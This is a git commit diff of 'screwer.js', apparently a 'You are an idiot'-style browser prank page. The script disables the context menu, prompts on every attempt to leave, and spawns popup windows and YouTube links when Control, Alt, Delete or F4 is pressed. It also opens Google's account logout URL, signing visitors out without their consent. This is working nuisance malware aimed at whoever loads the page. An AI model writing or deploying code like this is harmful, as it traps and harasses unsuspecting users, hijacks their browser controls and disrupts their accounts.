53e163fa8d45edc0be086bdf179f2518848dbd2d
urabigidiot <161262351+urabigidiot@users.noreply.github.com>
2024-06-18 19:52:30 -0400

    Update screwer.js

--- screwer.js
+++ screwer.js
@@ -2,7 +2,10 @@ window.onbeforeunload = () => "Are you an idiot?";
 window.oncontextmenu = () => false;
 window.onkeydown = async () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
-		await proCreate(6);
+		
+openxWindow("https://www.youtube.com/watch?v=NARxgXEdlzs")
+openxWindow("https://youtu.be/WJ9VBdASXyE")
+		await proCreate(6,"troll.html");
 		alert("You are an idiot!");
 	}
 	
@@ -13,12 +16,7 @@ async function handleClick() {
 	window.onbeforeunload = () => "Are you an idiot?";
 };
 window.onload = playBall;
-
-alert("YOU ARE AN IDIOT!! HGAHAHAHA");
 proCreate(3,"https://www.google.com/accounts/Logout")
-proCreate(1,"troll.html")
 function openxWindow(url) {
 	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 }
-openxWindow("https://www.youtube.com/watch?v=NARxgXEdlzs")
-openxWindow("https://youtu.be/WJ9VBdASXyE")
